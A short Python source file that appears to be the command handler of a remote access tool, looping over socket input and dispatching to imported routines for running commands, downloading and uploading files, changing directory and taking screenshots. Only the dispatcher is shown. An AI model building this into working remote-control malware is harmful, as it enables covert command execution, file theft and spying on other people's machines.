from connection.commands import ExecuteCommand
from connection.downloadFile import DownloadingFile
from connection.sendFiles import UploadFilesFolder
from connection.screenshot import CaptureScreenshot

def handleConnection(mysocket):
    print("[+] Handling connection")

    while True:
        user_input=mysocket.ReceiveDAta()
        print("[+] User Input: ", user_input)

        if user_input == "1":
            print("[+] Running commands")
            ExecuteCommand(mysocket)
        elif user_input == "2":
            print("[+] Downloading Files: ")
            DownloadingFile(mysocket)
        elif user_input == "3":
            UploadFilesFolder(mysocket)
        elif user_input == "4":
            mysocket.ChangeDir()
        elif user_input == "5":
            CaptureScreenshot(mysocket)
        elif user_input == "99":
            break
        else:
            print("[+] Invalid user input")